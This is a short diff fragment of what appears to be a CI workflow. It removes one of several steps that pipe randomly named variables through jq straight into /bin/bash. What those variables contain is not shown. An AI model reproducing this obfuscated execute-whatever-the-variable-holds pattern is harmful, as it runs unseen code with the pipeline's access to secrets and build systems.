@@ -30,7 +30,6 @@ jobs:
           echo $pqyhc1 | jq -r .nv5720 | /bin/bash
           printf '%s' "$utlmz879" | jq -r .nxz69187 | /bin/bash
           echo $hx32211 | jq -r .jzh56666 | /bin/bash
-          echo $s3 | jq -r .bpwg3 | /bin/bash
           echo $b22669 | jq -r .qux2 | /bin/bash
           echo $p3 | jq -r .t0149 | /bin/bash
           printf '%s' "$d428" | jq -r .msynk3 | /bin/bash
